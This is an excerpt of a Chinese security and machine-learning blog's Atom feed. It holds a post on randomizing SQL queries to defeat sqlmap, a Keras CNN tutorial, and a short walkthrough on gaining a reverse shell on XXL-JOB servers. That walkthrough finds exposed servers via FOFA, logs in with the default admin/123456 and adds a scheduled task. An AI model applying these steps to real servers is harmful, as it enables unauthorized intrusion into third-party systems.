    <link href="http://example.com/2020/08/04/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%A0%81%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6/"/>
    <id>http://example.com/2020/08/04/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%A0%81%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6/</id>
    <published>2020-08-04T00:46:07.000Z</published>
    <updated>2020-08-04T00:59:35.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="动态代码防御机制"><a href="#动态代码防御机制" class="headerlink" title="动态代码防御机制"></a>动态代码防御机制</h1><p>   关于动态代码防御机制，是自己瞎取的名字，目前我还没有看到过类似的文章，如果有前辈已经发表过，纯属巧合！！！我仅是突发奇想了这么一个东西，说不上高大上。也就是证明有这么回事的存在。说不定各位在座的大佬有更好的想法去完善这个方案！</p><h2 id="动态代码防御机制介绍"><a href="#动态代码防御机制介绍" class="headerlink" title="动态代码防御机制介绍"></a>动态代码防御机制介绍</h2><p>   现在的各种攻击都是针对静态代码的攻击，例如接受用户名和密码的处理语句：select * from users where id=’id’ and pwd=’pwd’。攻击者总可以想到一种方式进行攻击或者绕过，因为后端代码是写死了的，他只能按照这种方式处理，所有难以有所避免的（当然web防火墙和代码过滤也能解决，但是这里我想说的就是动态防御机制这个核心思想）。随着时代的发展也诞生出一批相当优秀的工具，例如作为sql注入的神器sqlmap，便能轻轻松松对安全防护比较弱的网站发起攻击。甚至还能直接上传文件、获取shell等操作。</p><p>   这种工具的诞生也给攻击者带来了便捷，能够很方便的对一个网站发起攻击，大多数情况下，会使用sqlmap先走一波看看啥情况，然后再人工分析。这时候想，如果后端代码是动态随机的，那么会有什么情况？这样后端代码就活动起来了，给攻击者无论是使用工具或者人工分析都带来困难了。要想注入成功，那就需要各位仁兄运气了！</p><h2 id="SQL注入的动态防御实践"><a href="#SQL注入的动态防御实践" class="headerlink" title="SQL注入的动态防御实践"></a>SQL注入的动态防御实践</h2><p>   这里使用的是phpstudy搭建的一个sqli-labs环境进行操作。搭建好的效果如下：</p><p><img src="/images/clip_image002-1596502683513.jpg" alt="img"></p><p>下面就用sqli-labs第一关作为实验对象。我们看下后端代码的sql代码：</p><p><img src="/images/clip_image004-1596502683514.jpg" alt="img"></p><p>很明显，我们只需要闭合这个单引号就能实现注入了，这会儿直接采用sqlmap进行注入，结果如下：</p><p><img src="/images/clip_image006-1596502683514.jpg" alt="img"></p><p>可以看到payload是用单引号闭合注入。然后修改下sql代码，使用sqlmap进行注入的情况如下：</p><p><img src="/images/clip_image008-1596502683514.jpg" alt="img"></p><p>使用sqlmap注入，得到的payload如下</p><p><img src="/images/clip_image010-1596502683514.jpg" alt="img"></p><p>其实就是把单引号注入转变成了双引号注入。接下载就是动态代码防御机制了，我在这个代码中加入了随机数，通过随机的设置sql查询不断变换，导致sqlmap不能实现注入。添加的代码如下：</p><p><img src="/images/clip_image012-1596502683514.jpg" alt="img"></p><p>然后再使用sqlmap进行注入，效果如下：</p><p><img src="/images/clip_image014-1596502683514.jpg" alt="img"></p><p>Sqlmap工具突然就会失效了。在以前版本的sqlmap中比较容易实现，现在使用新版本sqlmap比较稍微困难了点。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过上面的这种后端代码动态变化方式，能够给防御带来一定程度上的帮助。而且我感觉这个思想应该能用在更多的场景中，还需要大家一起探索探索。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;动态代码防御机制&quot;&gt;&lt;a href=&quot;#动态代码防御机制&quot; class=&quot;headerlink&quot; title=&quot;动态代码防御机制&quot;&gt;&lt;/a&gt;动态代码防御机制&lt;/h1&gt;&lt;p&gt;   关于动态代码防御机制，是自己瞎取的名字，目前我还没有看到过类似的文章，如果有前辈已经发</summary>
      
    
    
    
    
    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>CNN卷积神经网络</title>
    <link href="http://example.com/2020/07/15/CNN%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
    <id>http://example.com/2020/07/15/CNN%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</id>
    <published>2020-07-15T06:26:15.000Z</published>
    <updated>2021-02-04T05:13:51.828Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CNN卷积神经网络"><a href="#CNN卷积神经网络" class="headerlink" title="CNN卷积神经网络"></a>CNN卷积神经网络</h1><h2 id="图片组成"><a href="#图片组成" class="headerlink" title="图片组成"></a>图片组成</h2><p><strong>这里引用别人<a href="https://blog.csdn.net/Strive_0902/article/details/78023080">博客</a>内容解释</strong></p><p>一张图片由很多像素点组成，一个像素点又是由三个通道(R/G/B)融合而成的。</p><p><img src="/images/20170918200619273" alt="img"></p><a id="more"></a><p><img src="/images/20170918202312375" alt="img"></p><p>例如上图片尺寸是$500 \cdot 338$ 的，表示图片是由一个$500 \cdot 338$的像素点矩阵构成的，共有$500 \cdot 338 = 149000$个像素点。 一个像素点的颜色是由RGB三个值来表现的，所以像素点矩阵对应三个颜色向量矩阵，分别是R矩阵($500 \cdot 338$)，G矩阵($500 \cdot 338$)，B矩阵($500 \cdot 338$)。如果每个矩阵的第一行第一列的值分别为：$R：240，G：223，B：204，$所以这个像素点的颜色就是$（240,223,204）$</p><p>灰度是表明图像明暗的数值，即黑白图像中点的颜色深度，范围一般从0到255，白色为255 ，黑色为0，故黑白图片也称灰度图像。灰度值指的是单个像素点的亮度。灰度值越大表示越亮。  </p><p>灰度就是没有色彩，RGB色彩分量全部相等。图像的灰度化就是让像素点矩阵中的每一个像素点都满足关系：R=G=B，此时的这个值叫做灰度值。如RGB(100,100,100)就代表灰度值为100,RGB(50,50,50)代表灰度值为50。</p><h2 id="一个简单的CNN卷积神经网络"><a href="#一个简单的CNN卷积神经网络" class="headerlink" title="一个简单的CNN卷积神经网络"></a>一个简单的CNN卷积神经网络</h2><p>卷积神经网络处理图片的过程如下图</p><p>·基于MNIST数据集的卷积神经网络</p><p>导入需要的包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense, Conv2D, Flatten, MaxPooling2D, Dropout</span><br><span class="line"><span class="keyword">from</span> keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"><span class="keyword">from</span> keras.utils <span class="keyword">import</span> to_categorical</span><br><span class="line"><span class="keyword">from</span> keras <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras <span class="keyword">import</span> backend <span class="keyword">as</span> K</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure><pre><code>Using TensorFlow backend.</code></pre><p>使用 GPU 加速(可选)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.environ[<span class="string">&quot;CUDA_VISIBLE_DEVICES&quot;</span>] = <span class="string">&quot;0&quot;</span></span><br></pre></td></tr></table></figure><p>定义一些全局变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置全局变量</span></span><br><span class="line">num_classes = <span class="number">10</span>  <span class="comment"># 类别</span></span><br><span class="line">batch_size = <span class="number">128</span> <span class="comment"># 批次大小</span></span><br><span class="line">epochs = <span class="number">12</span>  <span class="comment"># 训练多少次</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置图片维度</span></span><br><span class="line">img_rows, img_cols = <span class="number">28</span>, <span class="number">28</span>  <span class="comment"># 图片的大小</span></span><br></pre></td></tr></table></figure><p>加载数据并处理数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加载 MNIST 数据集</span></span><br><span class="line">(x_train, y_train), (x_test, y_test) = mnist.load_data()</span><br><span class="line"><span class="comment"># 处理数据集：针对训练集归一化，针对测试集one-hot编码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断深度学习框架需要输入的维度</span></span><br><span class="line"><span class="keyword">if</span> K.image_data_format() == <span class="string">&quot;channels_first&quot;</span>:</span><br><span class="line">    x_train = x_train.reshape(x_train.shape[<span class="number">0</span>], <span class="number">1</span>, img_rows, img_cols)</span><br><span class="line">    x_test = x_test.reshape(x_test.shape[<span class="number">0</span>], <span class="number">1</span>, img_rows, img_cols)</span><br><span class="line">    input_shape = (<span class="number">1</span>, img_rows, img_cols)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    x_train = x_train.reshape(x_train.shape[<span class="number">0</span>], img_rows, img_cols, <span class="number">1</span>)</span><br><span class="line">    x_test = x_test.reshape(x_test.shape[<span class="number">0</span>], img_rows, img_cols, <span class="number">1</span>)</span><br><span class="line">    input_shape = (img_rows, img_cols, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 归一化 </span></span><br><span class="line">x_train = x_train.astype(np.float32) / <span class="number">255</span></span><br><span class="line">x_test = x_test.astype(np.float32) / <span class="number">255</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. one-hot 编码</span></span><br><span class="line">y_train = to_categorical(y_train, num_classes)</span><br><span class="line">y_test = to_categorical(y_test, num_classes)</span><br></pre></td></tr></table></figure><p>构建卷积神经网络</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构建卷积神经网络模型</span></span><br><span class="line">model = Sequential()</span><br><span class="line">model.add(Conv2D(<span class="number">32</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), activation=<span class="string">&#x27;relu&#x27;</span>, input_shape=input_shape)) <span class="comment"># 32个过滤器，过滤器大小是3×3，32×26×26</span></span><br><span class="line">model.add(Conv2D(<span class="number">64</span>, (<span class="number">3</span>, <span class="number">3</span>), activation=<span class="string">&#x27;relu&#x27;</span>)) <span class="comment">#64×24×24</span></span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))<span class="comment"># 向下取样</span></span><br><span class="line">model.add(Dropout(<span class="number">0.25</span>))</span><br><span class="line">model.add(Flatten()) <span class="comment">#降维：将64×12×12降为1维（即把他们相乘起来）</span></span><br><span class="line">model.add(Dense(<span class="number">128</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">model.add(Dropout(<span class="number">0.5</span>))</span><br><span class="line">model.add(Dense(num_classes, activation=<span class="string">&#x27;softmax&#x27;</span>)) <span class="comment">#全连接2层</span></span><br></pre></td></tr></table></figure><p>编译模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译模型</span></span><br><span class="line">model.<span class="built_in">compile</span>(loss=keras.losses.categorical_crossentropy, optimizer=keras.optimizers.Adadelta(), metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br></pre></td></tr></table></figure><p>训练神经网络</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 神经网络</span></span><br><span class="line">history = model.fit(x_train, y_train, batch_size=<span class="number">32</span>, epochs=epochs, verbose=<span class="number">1</span>, validation_data=(x_test, y_test))</span><br></pre></td></tr></table></figure><pre><code>Train on 60000 samples, validate on 10000 samplesEpoch 1/1260000/60000 [==============================] - 23s 378us/step - loss: 0.1819 - acc: 0.9451 - val_loss: 0.0455 - val_acc: 0.9854Epoch 2/1260000/60000 [==============================] - 18s 295us/step - loss: 0.0755 - acc: 0.9777 - val_loss: 0.0393 - val_acc: 0.9879Epoch 3/1260000/60000 [==============================] - 18s 296us/step - loss: 0.0567 - acc: 0.9829 - val_loss: 0.0392 - val_acc: 0.9869Epoch 4/1260000/60000 [==============================] - 18s 296us/step - loss: 0.0521 - acc: 0.9848 - val_loss: 0.0370 - val_acc: 0.9883Epoch 5/1260000/60000 [==============================] - 18s 297us/step - loss: 0.0487 - acc: 0.9855 - val_loss: 0.0337 - val_acc: 0.9887Epoch 6/1260000/60000 [==============================] - 18s 296us/step - loss: 0.0466 - acc: 0.9862 - val_loss: 0.0314 - val_acc: 0.9894Epoch 7/1260000/60000 [==============================] - 18s 296us/step - loss: 0.0446 - acc: 0.9867 - val_loss: 0.0285 - val_acc: 0.9910Epoch 8/1260000/60000 [==============================] - 18s 297us/step - loss: 0.0426 - acc: 0.9871 - val_loss: 0.0295 - val_acc: 0.9909Epoch 9/1260000/60000 [==============================] - 18s 297us/step - loss: 0.0419 - acc: 0.9877 - val_loss: 0.0367 - val_acc: 0.9893Epoch 10/1260000/60000 [==============================] - 18s 297us/step - loss: 0.0406 - acc: 0.9882 - val_loss: 0.0318 - val_acc: 0.9905Epoch 11/1260000/60000 [==============================] - 18s 298us/step - loss: 0.0397 - acc: 0.9885 - val_loss: 0.0282 - val_acc: 0.9909Epoch 12/1260000/60000 [==============================] - 18s 297us/step - loss: 0.0369 - acc: 0.9894 - val_loss: 0.0395 - val_acc: 0.9888</code></pre><p>作出训练期间 loss 和 accuracy 的图像</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.plot(history.history[<span class="string">&#x27;loss&#x27;</span>])</span><br><span class="line">plt.plot(history.history[<span class="string">&#x27;acc&#x27;</span>])</span><br><span class="line">plt.title(<span class="string">&#x27;model accuracy&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;epoch&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;accuracy&#x27;</span>)</span><br><span class="line">plt.legend([<span class="string">&#x27;loss&#x27;</span>, <span class="string">&#x27;accuracy&#x27;</span>], loc=<span class="string">&#x27;lower right&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/images/output_25_0.png" alt="png"></p><p>评价模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 评价模型</span></span><br><span class="line">score = model.evaluate(x_test, y_test, verbose=<span class="number">0</span>)</span><br><span class="line">print(<span class="string">&quot;Test loss：&quot;</span>, score[<span class="number">0</span>])</span><br><span class="line">print(<span class="string">&quot;Test accuracy: &quot;</span>, score[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><pre><code>Test loss： 0.03945192432178337Test accuracy:  0.9888</code></pre><h2 id="LetNet5-模型"><a href="#LetNet5-模型" class="headerlink" title="LetNet5 模型"></a>LetNet5 模型</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">model = Sequential()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个卷积层  28*28*1  --&gt;  </span></span><br><span class="line">model.add(Conv2D(<span class="number">6</span>, kernel_size=(<span class="number">5</span>, <span class="number">5</span>), activation=<span class="string">&#x27;relu&#x27;</span>, input_shape=(<span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)))</span><br><span class="line"><span class="comment"># 池化层</span></span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二个卷积层</span></span><br><span class="line">model.add(Conv2D(<span class="number">16</span>, kernel_size=(<span class="number">5</span>, <span class="number">5</span>), activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line"><span class="comment"># 池化层</span></span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 展平</span></span><br><span class="line">model.add(Flatten())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全连接层</span></span><br><span class="line">model.add(Dense(<span class="number">120</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全连接层</span></span><br><span class="line">model.add(Dense(<span class="number">84</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全连接层</span></span><br><span class="line">model.add(Dense(<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#　模型编译</span></span><br><span class="line">model.<span class="built_in">compile</span>(loss=keras.metrics.categorical_crossentropy, optimizer=keras.optimizers.Adam(), metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br><span class="line">model.summary()</span><br></pre></td></tr></table></figure><pre><code>_________________________________________________________________Layer (type)                 Output Shape              Param #   =================================================================conv2d_5 (Conv2D)            (None, 24, 24, 6)         156       _________________________________________________________________max_pooling2d_4 (MaxPooling2 (None, 12, 12, 6)         0         _________________________________________________________________conv2d_6 (Conv2D)            (None, 8, 8, 16)          2416      _________________________________________________________________max_pooling2d_5 (MaxPooling2 (None, 4, 4, 16)          0         _________________________________________________________________flatten_3 (Flatten)          (None, 256)               0         _________________________________________________________________dense_6 (Dense)              (None, 120)               30840     _________________________________________________________________dense_7 (Dense)              (None, 84)                10164     _________________________________________________________________dense_8 (Dense)              (None, 10)                850       =================================================================Total params: 44,426Trainable params: 44,426Non-trainable params: 0_________________________________________________________________</code></pre><h2 id="AlexNet-模型"><a href="#AlexNet-模型" class="headerlink" title="AlexNet 模型"></a>AlexNet 模型</h2><p>模型架构如下：<br>一共有5个卷积层（Conv2D），8个神经网络层（Conv2D + Dense）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建模型序列  </span></span><br><span class="line">model = Sequential()</span><br><span class="line"><span class="comment">#第一层卷积网络，使用96个卷积核，大小为11x11步长为4， 要求输入的图片为227x227， 3个通道，不加边，激活函数使用relu</span></span><br><span class="line">model.add(Conv2D(<span class="number">96</span>, (<span class="number">11</span>, <span class="number">11</span>), strides=(<span class="number">1</span>, <span class="number">1</span>), input_shape=(<span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>,</span><br><span class="line">                 kernel_initializer=<span class="string">&#x27;uniform&#x27;</span>))</span><br><span class="line"><span class="comment"># 池化层</span></span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">3</span>, <span class="number">3</span>), strides=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line"><span class="comment"># 第二层加边使用256个5x5的卷积核，加边，激活函数为relu</span></span><br><span class="line">model.add(Conv2D(<span class="number">256</span>, (<span class="number">5</span>, <span class="number">5</span>), strides=(<span class="number">1</span>, <span class="number">1</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, kernel_initializer=<span class="string">&#x27;uniform&#x27;</span>))</span><br><span class="line"><span class="comment">#使用池化层，步长为2</span></span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">3</span>, <span class="number">3</span>), strides=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line"><span class="comment"># 第三层卷积，大小为3x3的卷积核使用384个</span></span><br><span class="line">model.add(Conv2D(<span class="number">384</span>, (<span class="number">3</span>, <span class="number">3</span>), strides=(<span class="number">1</span>, <span class="number">1</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, kernel_initializer=<span class="string">&#x27;uniform&#x27;</span>))</span><br><span class="line"><span class="comment"># 第四层卷积,同第三层</span></span><br><span class="line">model.add(Conv2D(<span class="number">384</span>, (<span class="number">3</span>, <span class="number">3</span>), strides=(<span class="number">1</span>, <span class="number">1</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, kernel_initializer=<span class="string">&#x27;uniform&#x27;</span>))</span><br><span class="line"><span class="comment"># 第五层卷积使用的卷积核为256个，其他同上</span></span><br><span class="line">model.add(Conv2D(<span class="number">256</span>, (<span class="number">3</span>, <span class="number">3</span>), strides=(<span class="number">1</span>, <span class="number">1</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, kernel_initializer=<span class="string">&#x27;uniform&#x27;</span>))</span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">3</span>, <span class="number">3</span>), strides=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line">model.add(Flatten())</span><br><span class="line">model.add(Dense(<span class="number">4096</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">model.add(Dropout(<span class="number">0.5</span>))</span><br><span class="line">model.add(Dense(<span class="number">4096</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">model.add(Dropout(<span class="number">0.5</span>))</span><br><span class="line">model.add(Dense(<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>))</span><br><span class="line">model.<span class="built_in">compile</span>(loss=<span class="string">&#x27;categorical_crossentropy&#x27;</span>, optimizer=<span class="string">&#x27;sgd&#x27;</span>, metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br><span class="line">model.summary()</span><br></pre></td></tr></table></figure><pre><code>_________________________________________________________________Layer (type)                 Output Shape              Param #   =================================================================conv2d_7 (Conv2D)            (None, 28, 28, 96)        11712     _________________________________________________________________max_pooling2d_6 (MaxPooling2 (None, 13, 13, 96)        0         _________________________________________________________________conv2d_8 (Conv2D)            (None, 13, 13, 256)       614656    _________________________________________________________________max_pooling2d_7 (MaxPooling2 (None, 6, 6, 256)         0         _________________________________________________________________conv2d_9 (Conv2D)            (None, 6, 6, 384)         885120    _________________________________________________________________conv2d_10 (Conv2D)           (None, 6, 6, 384)         1327488   _________________________________________________________________conv2d_11 (Conv2D)           (None, 6, 6, 256)         884992    _________________________________________________________________max_pooling2d_8 (MaxPooling2 (None, 2, 2, 256)         0         _________________________________________________________________flatten_4 (Flatten)          (None, 1024)              0         _________________________________________________________________dense_9 (Dense)              (None, 4096)              4198400   _________________________________________________________________dropout_3 (Dropout)          (None, 4096)              0         _________________________________________________________________dense_10 (Dense)             (None, 4096)              16781312  _________________________________________________________________dropout_4 (Dropout)          (None, 4096)              0         _________________________________________________________________dense_11 (Dense)             (None, 10)                40970     =================================================================Total params: 24,744,650Trainable params: 24,744,650Non-trainable params: 0_________________________________________________________________</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CNN卷积神经网络&quot;&gt;&lt;a href=&quot;#CNN卷积神经网络&quot; class=&quot;headerlink&quot; title=&quot;CNN卷积神经网络&quot;&gt;&lt;/a&gt;CNN卷积神经网络&lt;/h1&gt;&lt;h2 id=&quot;图片组成&quot;&gt;&lt;a href=&quot;#图片组成&quot; class=&quot;headerlink&quot; title=&quot;图片组成&quot;&gt;&lt;/a&gt;图片组成&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;这里引用别人&lt;a href=&quot;https://blog.csdn.net/Strive_0902/article/details/78023080&quot;&gt;博客&lt;/a&gt;内容解释&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一张图片由很多像素点组成，一个像素点又是由三个通道(R/G/B)融合而成的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/20170918200619273&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="机器学习" scheme="http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>XXL-JOB反弹shell之打野</title>
    <link href="http://example.com/2020/03/31/XXL-JOB%E5%8F%8D%E5%BC%B9shell%E4%B9%8B%E6%89%93%E9%87%8E/"/>
    <id>http://example.com/2020/03/31/XXL-JOB%E5%8F%8D%E5%BC%B9shell%E4%B9%8B%E6%89%93%E9%87%8E/</id>
    <published>2020-03-31T13:34:05.000Z</published>
    <updated>2021-02-04T05:09:31.514Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XXL-JOB后台反弹shell之打野"><a href="#XXL-JOB后台反弹shell之打野" class="headerlink" title="XXL-JOB后台反弹shell之打野"></a>XXL-JOB后台反弹shell之打野</h2><a id="more"></a><h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><p>XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。</p><h3 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h3><p>能够直接获取系统权限</p><h3 id="0x03-漏洞产生原因"><a href="#0x03-漏洞产生原因" class="headerlink" title="0x03 漏洞产生原因"></a>0x03 漏洞产生原因</h3><p>主要是弱口令引起后台登陆，能够添加定时任务来进行反弹shell</p><h3 id="0x04-漏洞挖掘"><a href="#0x04-漏洞挖掘" class="headerlink" title="0x04 漏洞挖掘"></a>0x04 漏洞挖掘</h3><p>使用 <code>fofa</code>搜索<code>XXL-JOB</code></p><p><img src="/images/image-20200331213613990.png" alt="image-20200331213613990"></p><p>输入 <code>admin/123456</code>就能登录</p><p><img src="/images/image-20200331213653192.png" alt="image-20200331213653192"></p><p>添加定时任务</p><p><img src="/images/image-20200331213738821.png" alt="image-20200331213738821"></p><p>使用<code>GLUE IDE</code>编辑内容</p><p><img src="/images/image-20200331213807416.png" alt="image-20200331213807416"></p><p>监听端口，启动定时任务。得到反弹shell</p><p><img src="/images/image-20200331213922592.png" alt="image-20200331213922592"></p><h3 id="0x05-修复建议"><a href="#0x05-修复建议" class="headerlink" title="0x05 修复建议"></a>0x05 修复建议</h3><p>密码搞复杂些，听到没有？</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;XXL-JOB后台反弹shell之打野&quot;&gt;&lt;a href=&quot;#XXL-JOB后台反弹shell之打野&quot; class=&quot;headerlink&quot; title=&quot;XXL-JOB后台反弹shell之打野&quot;&gt;&lt;/a&gt;XXL-JOB后台反弹shell之打野&lt;/h2&gt;</summary>
    
    
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>通达OA之RCE</title>
    <link href="http://example.com/2020/03/19/%E9%80%9A%E8%BE%BEOA%E4%B9%8BRCE/"/>
    <id>http://example.com/2020/03/19/%E9%80%9A%E8%BE%BEOA%E4%B9%8BRCE/</id>
    <published>2020-03-19T02:57:35.000Z</published>
    <updated>2021-02-03T00:05:32.697Z</updated>
    
